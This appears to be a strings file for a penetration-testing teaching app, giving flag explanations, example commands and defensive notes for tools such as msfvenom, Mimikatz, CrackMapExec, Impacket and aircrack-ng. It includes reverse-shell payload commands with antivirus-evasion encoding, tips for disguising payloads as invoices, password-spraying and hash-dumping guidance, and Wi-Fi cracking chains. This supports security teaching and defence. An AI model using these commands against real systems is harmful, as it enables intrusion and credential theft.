-all.teach: Without -all, subfinder uses free sources only. With API keys for Shodan, VirusTotal, Censys configured in ~/.config/subfinder/config.yaml, -all dramatically increases results.

-recursive.label: Recursive Discovery
-recursive.desc: Recursively find subdomains of discovered subdomains.
-recursive.teach: target.com → dev.target.com → db.dev.target.com. Deep recursion reveals internal-facing services accidentally exposed.

-t.label: Threads
-t.teach: More threads = faster enumeration across sources. Not limited by network since it's querying APIs, not the target.

Pipeline.desc: Full recon pipeline: subs → alive → scan.

subfinder.defend_notes: Subfinder is completely passive — you cannot detect it since it never touches your infrastructure. Defense is asset management: know what subdomains you own, use certificate transparency monitoring (Facebook CT Monitor, crt.sh alerts), and take down forgotten/orphaned subdomains. Enable HTTPS on all subdomains including internal ones.
mitre_techniques: T1596.003 - Search Open Technical Databases: Digital Certificates
T1596.005 - Search Open Technical Databases: Scan Databases

amass.name: AMASS
amass.description: In-depth attack surface mapping and asset discovery by OWASP. Combines passive OSINT with active DNS enumeration, certificate transparency, ASN discovery, and network graph building. The most comprehensive subdomain/infrastructure recon tool available.
amass.teach_intro: AMASS doesn't just find subdomains — it maps the entire attack surface. It discovers ASNs, CIDRs, IP ranges, related domains, and builds a relationship graph of everything connected to the target. Use it when you need the deepest possible picture before an engagement.

enum.label: Enumerate Mode
enum.teach: enum mode does full enumeration. Add -passive for OSINT-only. Default includes active DNS queries.

intel.label: Intel Mode
intel.desc: Discover root domains, ASNs, and CIDRs owned by an organization.
intel.teach: Intel mode finds everything a company owns by searching WHOIS, ASN records, and netblocks. Gives you domains you didn't know to look for.

-d.label: Target Domain
-d.teach: Primary target domain. Amass will find subdomains, related domains, and connected infrastructure.

-passive.label: Passive Only
-passive.desc: Only use passive OSINT sources. Never touches the target directly.
-passive.teach: Passive mode is OPSEC-safe. Queries CT logs, Shodan, VirusTotal, ThreatCrowd. Zero packets to target.

-active.label: Active Enumeration
-active.desc: Include active DNS resolution, zone transfers, and brute forcing.
-active.teach: Active mode sends DNS queries and attempts zone transfers. Much more thorough but leaves traces in DNS server logs.

-brute.label: DNS Brute Force
-brute.desc: Brute force subdomains with a wordlist.
-brute.teach: Brute force finds subdomains not indexed in any public database. Pair with a good wordlist from seclists.

-o.label: Output File
-o.teach: Always save amass output — it includes IP addresses, ASNs, and relationships, not just hostnames.

-json.label: JSON Output
-json.desc: Save results in JSON format with relationship data.
-json.teach: JSON output preserves the graph relationships. Import into maltego or process with jq to extract specific data types.

Intel Gather.desc: Find all domains/ASNs owned by organization name.

amass.defend_notes: Like subfinder, passive AMASS runs are invisible to you. Active mode generates DNS queries that appear in your DNS server logs. Monitor certificate transparency logs for unexpected certificates issued for your domains. Use DMARC, SPF, and DKIM to reduce email-based attack surface visibility.

enum4linux.name: Enum4linux
enum4linux.description: SMB/NetBIOS enumeration tool for Windows and Samba systems. Extracts: usernames, groups, shares, policies, OS info, and domain data using null sessions and anonymous authentication. Essential for Active Directory recon.
enum4linux.teach_intro: Enum4linux queries Windows SMB (port 445) and NetBIOS (port 139) for information available without valid credentials. Null sessions and anonymous authentication often expose usernames, share lists, and domain information — all useful for building your attack plan against Windows environments.

-a.label: All Simple Checks
-a.desc: Run all simple enumeration checks. The go-to flag for initial SMB recon.
-a.teach: -a runs everything: shares, users, groups, OS info, password policy. One flag gets you everything available without creds.

-U.label: Get Users
-U.teach: RID cycling starts from RID 500 (Administrator) and increments, resolving each RID to a username. Lists all local and domain accounts.

-S.label: Get Shares
-S.teach: Lists all SMB shares. SYSVOL and NETLOGON are standard AD shares. C$, ADMIN$ require admin rights. Look for unusual shares with sensitive data.

-P.label: Get Password Policy
-P.teach: Password policy reveals: min length, lockout threshold, lockout duration. Guides your brute force strategy — stay under the lockout count!

-G.label: Get Groups
-G.teach: Group membership reveals privilege structure. Who's in Domain Admins? Who's in Remote Desktop Users? Maps your escalation path.

-u.label: Username
-u.teach: Authenticated enum returns much more data. If you have any valid credentials (even low-priv), always use them.

-p.label: Password
-p.teach: Combined with -u. Even guest/guest or domain\user:password works for expanded enumeration.

Users Only.desc: Extract user list via RID cycling.

enum4linux.defend_notes: Disable null sessions: set RestrictAnonymous=1 in registry. Disable anonymous enumeration of SAM accounts and shares in Group Policy. Ensure SMB signing is enforced to prevent relay attacks. Block port 445 at the perimeter — no SMB should be externally accessible. Monitor for rapid SMB enumeration patterns in Windows Event Log (Event 4625, 4624).

crackmapexec.name: CrackMapExec
crackmapexec.description: Swiss Army knife for Windows/Active Directory post-exploitation and lateral movement. Tests credentials across entire subnets, dumps hashes, executes commands, deploys agents, and maps AD environments. Competes directly with Cobalt Strike for post-access operations.
crackmapexec.teach_intro: CME automates what would take hours manually in AD environments. Give it a subnet and credentials — it tests every host, shows which ones you can admin, and lets you dump SAM/NTDS hashes, execute commands, or spider shares across the entire domain in minutes.

smb.label: SMB Protocol
smb.desc: Target Windows SMB (the most common usage).
smb.teach: SMB mode tests credentials and executes against Windows hosts. A green [+] means success. Red [-] means denied. Pwn3d! means you're a local admin.

winrm.label: WinRM Protocol
winrm.teach: WinRM gives you PowerShell remoting. If SMB works and WinRM is open, you can drop into an interactive PS session.

ldap.label: LDAP Protocol
ldap.teach: LDAP against the DC dumps users, groups, GPOs, and trusts. --bloodhound exports data for BloodHound graph analysis.

-u.label: Username
-u.teach: Single username for targeted sprays. Use a file for mass testing: -u users.txt. Always respect lockout policies!

-p.label: Password
-p.teach: Combined with -u. For spraying: single password against many users. For dumping: use cracked password to authenticate.

-H.label: NT Hash (Pass the Hash)
-H.desc: Use NT hash instead of password for authentication.
-H.teach: Pass the Hash doesn't need the plaintext password — just the NTLM hash. Dump hashes from one machine, pass them to access others. Classic lateral movement.

--sam.label: Dump SAM Hashes
--sam.desc: Dump local SAM database (requires local admin).
--sam.teach: SAM contains local account hashes. Administrator hash often reused across machines. Crack with hashcat or pass-the-hash directly.

--ntds.label: Dump NTDS (DC Only)
--ntds.desc: Dump the entire Active Directory database from a Domain Controller.
--ntds.teach: NTDS.dit is the crown jewel — every domain account hash in one dump. Domain compromise means cracking every user's password.

--shares.label: Enumerate Shares
--shares.desc: List all accessible shares on target(s).
--shares.teach: Maps readable shares across the network. Find: finance folders, HR data, passwords.xlsx, backup files. Lateral movement goldmine.

-x.label: Execute Command
-x.desc: Execute a shell command on target(s).
-x.teach: -x runs the command via SMBExec. -X runs PowerShell commands. Start with 'whoami /priv' to see your privileges.

--bloodhound.label: BloodHound Collection
--bloodhound.desc: Collect AD data for BloodHound graph analysis.
--bloodhound.example: crackmapexec ldap dc01.domain.com -u user -p password --bloodhound -ns 192.168.1.1 --collection All
--bloodhound.teach: BloodHound data reveals shortest path to Domain Admin. Visual attack path mapping — indispensable for complex AD environments.

SMB Scan.desc: Quick SMB host discovery, no creds.

Dump SAM.desc: Dump local SAM hashes (needs local admin).

crackmapexec.defend_notes: CME operations are highly visible in Windows Event Logs: Event 4624 (logon), 4625 (failed logon), 4648 (explicit credential use). Enable detailed process creation logging. Credential Guard prevents LSASS dumping. LAPS randomizes local admin passwords preventing lateral movement via shared passwords. Implement network segmentation so workstations can't SMB-connect to each other.
mitre_techniques: T1021.002 - Remote Services: SMB/Windows Admin Shares

msfvenom.name: MSFvenom
msfvenom.description: Metasploit's payload generator and encoder. Creates shellcode, executables, scripts, and APKs in any format for any platform. Combines msfpayload and msfencode into a single tool. Used for creating reverse shells, bind shells, and staged/stageless payloads.
msfvenom.teach_intro: MSFvenom generates the malicious payload that runs on the victim after exploitation. Think of it as a payload factory: you choose what it does (reverse shell, bind shell, exec), what format (exe, elf, py, php, apk), and what architecture (x86, x64, ARM). The output goes on the victim, MSF multi/handler catches the connection.
msfvenom.default_command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={target} LPORT=4444 -f exe -o payload.exe

-p.label: Payload
-p.teach: Payload naming: OS/arch/type/connection. reverse_tcp calls back to you. bind_tcp opens a port on victim. Staged (/) downloads shellcode. Stageless (_) is self-contained.

-f.label: Output Format
-f.desc: Format: exe, elf, py, php, asp, aspx, rb, sh, apk, raw, c, dll.
-f.example: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe -o payload.exe
-f.teach: Match format to the target environment. PHP payload for web servers. ELF for Linux binaries. APK for Android. EXE for Windows.

-e.label: Encoder
-e.desc: Encode payload to avoid signature detection: -e x86/shikata_ga_nai
-e.example: msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe
-e.teach: Encoding transforms shellcode to evade AV signatures. -i 5 encodes 5 times. shikata_ga_nai is the classic encoder but most AV catches it now. Real evasion needs custom packers.

-i.label: Encoding Iterations
-i.example: msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe
-i.teach: More iterations = more obfuscation. But each iteration increases file size and many AV detect the encoding wrapper itself.

-o.label: Output File
-o.teach: Always specify -o. Otherwise msfvenom outputs raw bytes to stdout. Name the file something believable: update.exe, setup.exe, invoice.pdf.exe.

-a.label: Architecture
-a.desc: Target architecture: x86, x64, arm, mipsle.
-a.example: msfvenom -p linux/arm/shell_reverse_tcp -a arm LHOST=10.10.10.1 LPORT=4444 -f elf
-a.teach: Wrong arch = payload won't execute. Check with 'file <binary>' on the target system. ARM for Raspberry Pi, IoT devices, Android.

--platform.label: Target Platform
--platform.desc: Target OS: windows, linux, osx, android, php, python, java.
--platform.example: msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe
--platform.teach: Platform determines which payload options are available. Usually auto-detected from the payload name.

-l payloads.label: List Payloads
-l payloads.desc: List all available payloads filtered by string.
-l payloads.teach: Hundreds of payload options. grep for your OS: msfvenom -l payloads | grep 'linux/x64' | grep 'shell'

msfvenom.defend_notes: EDR solutions detect Meterpreter's shellcode patterns, process injection, and C2 beaconing even through encoding. Modern AV (Windows Defender, CrowdStrike) catches standard msfvenom payloads on disk. Real-world evasion requires custom packers, code signing, or in-memory execution. Application whitelisting blocks unauthorized executables entirely.

aircrack-ng.name: Aircrack-ng
aircrack-ng.description: The complete WiFi security auditing suite. Captures WPA2 handshakes, performs deauth attacks to force reconnections, cracks WEP/WPA/WPA2 passphrases, and monitors wireless traffic. The foundation of all WiFi security testing.
aircrack-ng.teach_intro: WiFi attacks follow a pattern: put your adapter in monitor mode → capture traffic → capture the 4-way handshake (force it with deauth) → crack the handshake offline with a wordlist. The handshake contains enough info to verify passwords without connecting to the AP.

-w.label: Wordlist
-w.teach: WPA2 cracking is a dictionary attack against the 4-way handshake. rockyou.txt covers common passphrases. Corporate networks often use complex passphrases — try specialized WiFi wordlists.

-b.label: Target BSSID
-b.desc: Filter by specific access point MAC address.
-b.teach: When your capture file has multiple APs, -b specifies which one to crack. Get the BSSID from airodump-ng output.

-e.label: Target ESSID
-e.teach: Alternative to -b. Use the network name if you don't have the BSSID.

airmon-ng.label: Monitor Mode
airmon-ng.desc: Enable/disable monitor mode on WiFi adapter.
airmon-ng.teach: Monitor mode lets your adapter see ALL WiFi frames, not just those addressed to it. Required step before any WiFi attack. Your interface becomes wlan0mon.

airodump-ng.label: Capture Traffic
airodump-ng.desc: Capture WiFi packets and discover networks.
airodump-ng.teach: Shows all APs in range with BSSID, channel, encryption, and connected clients. Focus on a target: airodump-ng -c [channel] --bssid [AP MAC] -w capture wlan0mon

aireplay-ng.label: Inject Packets / Deauth
aireplay-ng.desc: Inject packets including deauth attacks to force handshake capture.
aireplay-ng.teach: Deauth kicks the client off the network. When they reconnect, you capture the 4-way handshake. --deauth 0 runs continuously. Use -c to target a specific client.

hcxtools.label: PMKID Attack
hcxtools.desc: Capture PMKID without waiting for a client handshake.
hcxtools.example: hcxdumptool -i wlan0mon -o pmkid.pcapng && hcxpcapngtool pmkid.pcapng -o hash.txt && hashcat -m 22000 hash.txt rockyou.txt
hcxtools.teach: PMKID attack captures just from the beacon — no client needed! Convert capture to hashcat format 22000 for cracking. Faster than waiting for deauth handshake.

Capture Target.desc: Step 3: Target specific AP for capture.

Deauth Attack.desc: Step 4: Force handshake by deauthing clients.

aircrack-ng.defend_notes: WPA3 replaces WPA2's vulnerable 4-way handshake with SAE (Simultaneous Authentication of Equals) — immune to offline dictionary attacks. Use strong random WiFi passphrases (20+ chars) making dictionary attacks impractical. Detect deauth attacks with wireless IDS (Kismet, Waidps). Enterprise networks should use 802.1X/EAP authentication instead of PSK.

wireshark.name: Wireshark
wireshark.description: The world's most widely used network protocol analyzer. Captures and dissects live network traffic or analyzes saved PCAP files. Decodes 2000+ protocols including HTTP, DNS, SMB, TLS (with keys), SSH metadata, and more. Essential for incident response and network forensics.
wireshark.teach_intro: Wireshark sees every packet on the network. HTTP traffic is fully readable — usernames, passwords, session tokens all visible in plaintext. Even encrypted traffic reveals connection patterns, timing, and metadata. For forensics, a PCAP file is a complete record of everything that happened on the network.

-i.label: Interface
-i.desc: Capture on a specific network interface.
-i.teach: Specify the interface to capture on. Use 'ip link show' to list interfaces. wlan0 for WiFi, eth0 for Ethernet, lo for loopback.

-r.label: Read PCAP File
-r.desc: Open an existing packet capture file.
-r.teach: PCAP files are recordings of network traffic. Open them to analyze after the fact — incidents, CTF challenges, or saved captures.

-f.label: Capture Filter
-f.desc: BPF syntax filter applied during capture: 'host 192.168.1.1' or 'port 80'
-f.teach: Capture filters (BPF syntax) filter before writing to disk. Display filters (in the GUI) filter after capture. Always use capture filters on high-traffic networks.

-Y.label: Display Filter
-Y.teach: Display filters let you find specific traffic. 'http.request' shows all HTTP requests. 'dns' shows all DNS. 'smb2' shows SMB. 'frame contains password' searches all packets for the word password.

tshark.label: TShark (CLI)
tshark.desc: Command-line version of Wireshark. Perfect for scripting and remote captures.
tshark.teach: TShark is Wireshark without the GUI. Use it on headless servers, in scripts, or over SSH. tshark -r file.pcap -T fields -e http.request.uri extracts all HTTP URLs.

HTTP Filter.desc: Show only HTTP traffic from PCAP.

wireshark.defend_notes: Encrypt everything — TLS 1.3 makes payload capture useless. Even with a PCAP you only see encrypted blobs. For internal networks: enable SMB signing (prevents SMB relay), use encrypted protocols only (SSH not Telnet, HTTPS not HTTP, SFTP not FTP). Network TAPs and SPAN ports for legitimate monitoring should be locked down — an attacker with TAP access sees everything.

mimikatz.name: Mimikatz
mimikatz.description: Windows credential extraction tool. Dumps plaintext passwords, NTLM hashes, Kerberos tickets, and certificates from Windows memory (LSASS). The most dangerous credential tool in existence — runs after gaining admin access.
mimikatz.teach_intro: Mimikatz reads from LSASS (Local Security Authority Subsystem Service), the Windows process that manages authentication. When users log in, LSASS caches their credentials in memory for convenience. Mimikatz extracts them — often including plaintext passwords for recently logged-in users.

sekurlsa::logonpasswords.label: Dump Logon Passwords
sekurlsa::logonpasswords.desc: Extract plaintext passwords and NTLM hashes from LSASS memory.
sekurlsa::logonpasswords.teach: The holy grail. Shows all currently cached credentials: username, domain, NTLM hash, and sometimes plaintext password. Requires SYSTEM or local admin.

sekurlsa::wdigest.label: WDigest Credentials
sekurlsa::wdigest.desc: Show plaintext passwords cached by the WDigest protocol.
sekurlsa::wdigest.teach: WDigest caches plaintext passwords for legacy SSO. Disabled in Win8.1+ but can be re-enabled via registry. Legacy servers still have it on.

sekurlsa::tickets.label: Kerberos Tickets
sekurlsa::tickets.desc: List and export Kerberos tickets from memory.
sekurlsa::tickets.teach: Kerberos tickets let you authenticate without a password. Exported .kirbi files can be used with Pass the Ticket attacks or Kerberoasting.

lsadump::sam.label: SAM Database
lsadump::sam.desc: Dump local account hashes from the SAM database.
lsadump::sam.teach: SAM holds local account hashes. Requires SYSTEM. Hashes are in NTLM format — crack with hashcat or pass directly.

lsadump::dcsync.label: DCSync Attack
lsadump::dcsync.desc: Impersonate a DC and request password hashes via replication protocol.
lsadump::dcsync.teach: DCSync doesn't touch LSASS — it uses replication protocols to request hashes from the DC. Stealthier than running on the DC itself. Requires DA or replication rights.

kerberos::golden.label: Golden Ticket
kerberos::golden.desc: Forge a Kerberos ticket granting ticket (TGT) using the KRBTGT hash.
kerberos::golden.teach: Golden Ticket is god-mode in AD. With the KRBTGT hash you create valid Kerberos tickets for ANY user including non-existent ones — works for 10 years. Full domain persistence.

privilege::debug.label: Enable Debug Privilege
privilege::debug.desc: Required before accessing LSASS. Run first.
privilege::debug.teach: Debug privilege allows reading other process memory including LSASS. Always run this first or credential extraction commands will fail.

token::elevate.label: Token Impersonation
token::elevate.desc: Impersonate SYSTEM token for higher privileges.
token::elevate.teach: Elevates to SYSTEM even if running as admin. SYSTEM has more rights than admin on Windows. Required for some credential operations.

Full Dump.desc: Enable debug privilege then dump all credentials.

DCSync DA.desc: DCSync attack to pull Domain Admin hash.

Export Tickets.desc: Export all Kerberos tickets to .kirbi files.

mimikatz.defend_notes: Windows Credential Guard (virtualization-based security) isolates LSASS in a hypervisor-protected container making Mimikatz memory reading impossible. Enable Protected Users security group — prevents credential caching. Disable WDigest (HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest → UseLogonCredential = 0). Enable LSASS PPL (Protected Process Light). Monitor for process access to LSASS (Event 4663, 10).

bloodhound.name: BloodHound
bloodhound.description: Active Directory attack path mapping tool. Collects AD relationships and visualizes them as a graph, showing the shortest paths from any compromised account to Domain Admin. Reveals privilege escalation paths that would take days to find manually.
bloodhound.teach_intro: BloodHound thinks of Active Directory as a graph where users, groups, computers, and GPOs are nodes connected by edges (relationships). It finds attack paths like: you own user A → user A is local admin on computer B → computer C's admin is logged into B → C's admin is in Domain Admins. Each hop is a lateral movement opportunity.

SharpHound.label: Data Collector (Windows)
SharpHound.desc: Windows collector that gathers AD data. Run as domain user.
SharpHound.teach: SharpHound collects from Windows. -c All gathers everything: sessions, ACLs, trusts, GPOs. Output is a zip of JSON files you import into BloodHound.

bloodhound-python.label: Python Collector (Linux)
bloodhound-python.desc: Linux-based collector. Run from Kali with domain credentials.
bloodhound-python.teach: Linux collector — no need to run anything on Windows. Requires valid domain credentials. -c All collects sessions, ACLs, trusts. Import the resulting JSON files into BloodHound.

-c All.label: Collect Everything
-c All.desc: Collect all data types: Session, ACL, ObjectProps, Trusts, LocalAdmin, RDP, DCOM, PSRemote.
-c All.teach: All collection methods give you the most complete graph. Session data shows which users are logged into which computers right now — critical for finding paths.

Find Shortest Paths to DA.label: Attack Path to DA
Find Shortest Paths to DA.desc: Built-in BloodHound query: find paths from owned nodes to Domain Admins.
Find Shortest Paths to DA.example: In BloodHound GUI: Analysis → Find Shortest Paths to Domain Admins
Find Shortest Paths to DA.teach: The killer feature. Mark your compromised accounts as Owned, then run this query. BloodHound shows every attack path. Focus on paths with the fewest hops.

Kerberoastable Accounts.label: Find Kerberoastable Users
Kerberoastable Accounts.desc: Find service accounts with SPNs that can be Kerberoasted.
Kerberoastable Accounts.example: In BloodHound GUI: Analysis → Find all Kerberoastable Users
Kerberoastable Accounts.teach: Kerberoastable accounts have SPNs — request their service tickets, extract, crack offline. Service accounts often have weak passwords and excessive privileges.

flags: bloodhound-python -u USER -p PASS -d DOMAIN -c All -ns DC_IP
Collect (Linux).desc: Collect AD data from Linux with credentials.

bloodhound.defend_notes: BloodHound's collection methods are detectable: LDAP queries for ACLs, SMB connections to enumerate local admin, and session collection generate logs. Enable advanced audit policies (Account Logon, DS Access). The attack paths BloodHound reveals are real misconfigurations — remediate them: remove excessive ACL rights, clean up group membership, implement least privilege. Review DCSync rights monthly.
mitre_techniques: T1069.002 - Permission Groups Discovery: Domain Groups

evil-winrm.name: Evil-WinRM
evil-winrm.description: Windows Remote Management shell for pentesting. Provides a fully functional PowerShell session with extra features: file upload/download, in-memory .NET assembly loading, Pass the Hash, Kerberos auth, and bypass for AMSI and logging.
evil-winrm.teach_intro: WinRM is Windows' built-in remote management protocol on port 5985/5986. Evil-WinRM connects to it and gives you a feature-rich shell. It's cleaner than a reverse Meterpreter session for interactive work — you get tab completion, history, and PowerShell's full power.

-i.label: Target IP
-i.teach: WinRM must be enabled on the target (it's on by default on Windows Server 2012+). Port 5985 (HTTP) or 5986 (HTTPS).

-u.label: Username
-u.teach: Any user with WinRM access works. Local admins, domain admins, and users in the Remote Management Users group.

-p.label: Password
-p.teach: Plaintext password authentication. If you have an NTLM hash instead, use -H for Pass the Hash.

-H.label: NT Hash (Pass the Hash)
-H.desc: Authenticate using NTLM hash instead of plaintext password.
-H.teach: Pass the Hash — no password needed! Dump the NTLM hash with mimikatz or secretsdump, pass it directly here. No cracking required.

-s.label: PS Scripts Path
-s.desc: Path to PowerShell scripts to load in memory.
-s.teach: Scripts are loaded into memory without touching disk. Invoke-Mimikatz, PowerView, AMSI bypass scripts — all available via tab completion.

-e.label: .NET Executables Path
-e.desc: Path to .NET executables to load via Invoke-Binary.
-e.teach: Load SharpHound, Rubeus, SafetyKatz entirely in memory using Invoke-Binary. Never touches disk — bypasses AV file scanning.

Pass the Hash.desc: Connect using NTLM hash — no password needed.

With Scripts.desc: Connect and load PS scripts in memory.

evil-winrm.defend_notes: Restrict WinRM access via firewall rules — only allow from specific management hosts. Monitor Event 4624 (logon type 3) and PowerShell ScriptBlock logging (Event 4104). Credential Guard blocks Pass the Hash. Enable PowerShell Constrained Language Mode to limit what attackers can do in a WinRM session. Log all WinRM connections in your SIEM.
mitre_techniques: T1021.006 - Remote Services: Windows Remote Management
T1550.002 - Use Alternate Authentication Material: Pass the Hash

impacket.name: Impacket
impacket.description: Python library and collection of tools for Windows protocol attacks. Key tools: secretsdump (dump hashes), psexec (remote shell), wmiexec (WMI shell), smbclient (browse shares), GetUserSPNs (Kerberoasting), GetNPUsers (AS-REP roasting).
impacket.teach_intro: Impacket is the go-to toolkit for Windows Active Directory attacks from Linux. No need to run anything on Windows — attack directly from Kali. secretsdump dumps hashes remotely, psexec gives shells, and Kerberoasting extracts crackable service account hashes without touching the DC.

secretsdump.label: Dump Secrets Remotely
secretsdump.desc: Remotely dump SAM/NTDS hashes via SMB without running anything on target.
secretsdump.teach: secretsdump connects via SMB, reads the SAM database remotely, and dumps all NTLM hashes. On a DC: dumps the entire NTDS.dit — every domain account hash.

psexec.label: PSExec Remote Shell
psexec.desc: Get an interactive shell via SMB service creation.
psexec.teach: psexec creates a temporary service on the target and gives you a SYSTEM shell. Very loud — creates services, writes files. Detected by AV/EDR but effective on legacy systems.

wmiexec.label: WMI Remote Shell
wmiexec.desc: Execute commands via WMI. Fileless and stealthier than psexec.
wmiexec.teach: WMI execution is semi-interactive and doesn't write files to disk. Much stealthier than psexec. Output comes back via SMB share.

GetUserSPNs.label: Kerberoasting
GetUserSPNs.desc: Request service tickets for accounts with SPNs and extract for offline cracking.
GetUserSPNs.teach: Kerberoasting: request a service ticket, extract the TGS hash, crack offline with hashcat -m 13100. Service accounts often have weak passwords and high privileges.

GetNPUsers.label: AS-REP Roasting
GetNPUsers.desc: Get crackable hashes for accounts with pre-auth disabled (no creds needed).
GetNPUsers.teach: AS-REP roasting requires NO credentials. Accounts with 'Do not require Kerberos preauthentication' return a crackable hash. Crack with hashcat -m 18200.

smbclient.label: SMB Client
smbclient.desc: Browse and interact with SMB shares from Linux.
smbclient.teach: Interactive SMB shell. List shares, download files, upload backdoors. Like FTP but for Windows file shares.

impacket.defend_notes: Kerberoasting is hard to prevent since requesting service tickets is normal. Mitigate by using Managed Service Accounts (MSAs) with auto-rotating passwords, or Group Managed Service Accounts (gMSAs). Monitor for excessive TGS requests (many tickets in short time) in Event 4769. AS-REP roasting prevention: require pre-authentication for all accounts (never enable 'Do not require Kerberos preauthentication').
mitre_techniques: T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting

linpeas.name: LinPEAS
linpeas.description: Linux Privilege Escalation Awesome Script. Automatically searches for privilege escalation vectors on Linux: SUID/SGID binaries, sudo misconfigs, writable paths, cron jobs, kernel exploits, interesting files, network info, and hundreds more checks.
linpeas.teach_intro: After getting a low-privilege shell, your goal is root. LinPEAS does the recon for you — it runs 300+ checks looking for every known Linux privesc vector. Color-coded output: red/yellow = high priority finding. Start at the red output and work your way down.

-a.label: All Checks (thorough)
-a.desc: Run all checks including slower network checks.
-a.teach: More thorough but slower. -a adds network enumeration and extra checks. Use when you have time and a stable shell.

-q.label: Quiet Mode
-q.desc: Don't show banner and don't ask questions.
-q.teach: Quieter output. Use when you want clean text for logging or when running via a script.

-o.label: Output to File
-o.desc: Save results to a file for later review.
-o.teach: Save output! LinPEAS results are your roadmap. Review offline without the time pressure of an active shell.

SUID.label: SUID Binaries
SUID.desc: Focus area: binaries with SUID bit set run as owner (often root).
SUID.teach: SUID binaries run as the file's owner regardless of who executes them. If root owns a SUID binary with a shell escape, you get root. Check GTFOBins for escape techniques.

Sudo.label: Sudo Misconfigs
Sudo.desc: Focus area: sudo rules that allow privesc.
Sudo.teach: sudo -l shows what you can run as root. 'NOPASSWD: /usr/bin/vim' → vim with :!bash = root shell. Check every allowed command on GTFOBins.

Cron.label: Cron Job Analysis
Cron.desc: Focus area: writable scripts run by root's crontab.
Cron.teach: If root runs a script you can write to, you own root. Check crontab entries and look for writable scripts or PATH components that you can hijack.

Full Run.desc: Thorough all-checks run, save to file.

One-Liner.desc: Fetch and run in one command.

linpeas.defend_notes: LinPEAS findings are actual vulnerabilities you must fix. Key remediations: audit SUID binaries (remove unnecessary SUID bits), review sudo rules (use specific paths, avoid NOPASSWD for interpreters), lock down cron job permissions (scripts should be root-owned and not world-writable), patch kernel CVEs, disable dangerous capabilities.
mitre_techniques: T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid

winpeas.name: WinPEAS
winpeas.description: Windows Privilege Escalation Awesome Script. Automates enumeration of Windows privesc vectors: service misconfigs, unquoted service paths, AlwaysInstallElevated, token privileges, auto-logon credentials, stored credentials, and registry checks.
winpeas.teach_intro: After landing on a Windows box as a low-priv user, WinPEAS finds your escalation path. It checks 200+ Windows-specific attack vectors. Color-coded like LinPEAS: red and yellow are your priorities. Common wins: SeImpersonatePrivilege (Potato attacks), unquoted service paths, weak service permissions.

systeminfo.label: System Information
systeminfo.teach: Missing patches = kernel/service exploits. Note the Windows build number and check against known unpatched CVEs.

servicesinfo.label: Services Enumeration
servicesinfo.teach: Unquoted service paths with spaces are a classic privesc: C:\Program Files\My App\service.exe — place malicious binary at C:\Program.exe and restart the service.

applicationsinfo.label: Applications
applicationsinfo.desc: List installed software and look for vulnerable versions.
applicationsinfo.teach: Old software versions = known exploits. Installed security software tells you what you're up against. DLL hijacking opportunities in software directories.

userinfo.label: User Info
userinfo.teach: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege → Potato attacks (JuicyPotato, PrintSpoofer, GodPotato). SeBackupPrivilege → read any file. SeDebugPrivilege → process injection.

Full Scan.desc: Run all WinPEAS checks (no args = everything).

winpeas.defend_notes: Fix the findings WinPEAS surfaces: use quoted paths in service configurations, review service permissions (never grant write to Everyone), disable AlwaysInstallElevated GPO, apply patches, restrict token privileges. Implement Windows Defender Application Control (WDAC) to prevent unauthorized executable runs. Regular vulnerability scanning catches these configurations.
mitre_techniques: T1548.002 - Abuse Elevation Control Mechanism: Bypass UAC

volatility3.name: Volatility 3
volatility3.description: The leading open-source memory forensics framework. Analyzes RAM dumps to extract: running processes, network connections, loaded DLLs, command history, encryption keys, passwords in memory, injected code, rootkits, and more.
volatility3.teach_intro: Memory forensics is like an X-ray of a running system at a moment in time. Every running process, open network connection, encryption key, and typed command exists in RAM. Volatility reads a memory dump (or live memory) and lets you query all of this data without running anything on the victim machine.

-f.label: Memory Image File
-f.teach: Memory dumps are taken with FTK Imager, WinPMem, or VM snapshot files. The .vmem file from VMware is directly readable by Volatility.

windows.pslist.label: Process List
windows.pslist.desc: List running processes from the process list.
windows.pslist.teach: Shows all running processes with PID, PPID, name, and timestamps. Look for unusual processes, unusual parents (cmd.exe spawned by Word = malware), and process names that mimic legit ones.

windows.pstree.label: Process Tree
windows.pstree.desc: Display processes in parent-child tree format.
windows.pstree.teach: Tree view reveals injection chains. powershell.exe under winword.exe is a macro payload. cmd.exe under explorer.exe is suspicious. Know the normal Windows process tree.

windows.netstat.label: Network Connections
windows.netstat.desc: List active and recent network connections.
windows.netstat.teach: Shows C2 connections even after the process closed the socket (sockets linger in memory). Maps process PID to network connections — identifies the C2 process.

windows.dlllist.label: DLL List
windows.dlllist.desc: List DLLs loaded by each process.
windows.dlllist.teach: Injected DLLs show up here. Unknown DLLs in system processes, DLLs loaded from temp directories, or DLLs with no path (reflective injection) are all red flags.

windows.cmdline.label: Command Lines
windows.cmdline.desc: Show command-line arguments for all processes.
windows.cmdline.teach: Reveals what commands were run to launch each process. Powershell.exe with base64 encoded arguments = encoded malware. certutil.exe downloading files is a classic LOLBin.

windows.malfind.label: Malware Finder
windows.malfind.desc: Find injected code and hidden processes using heuristics.
windows.malfind.teach: malfind looks for memory regions that are executable but not backed by a file — the signature of shellcode injection. Dumps suspicious regions for further analysis.

windows.hashdump.label: Dump Password Hashes
windows.hashdump.desc: Extract NTLM password hashes from memory.
windows.hashdump.teach: Like mimikatz but offline from a memory dump. Extracts SAM hashes from SYSTEM and SAM hive memory — crack with hashcat.

Triage.desc: Quick process list — first triage step.

Malware Hunt.desc: Hunt for injected code and hidden malware.

volatility3.defend_notes: Memory forensics is your best tool for detecting advanced threats that live only in RAM. Implement: regular memory dumps as part of your IR playbook, endpoint agents that capture memory on anomaly detection, and blue team training on interpreting Volatility output. EDR tools like CrowdStrike Falcon do live memory inspection automatically.
mitre_techniques: T1003.001 - OS Credential Dumping: LSASS Memory

autopsy.name: Autopsy
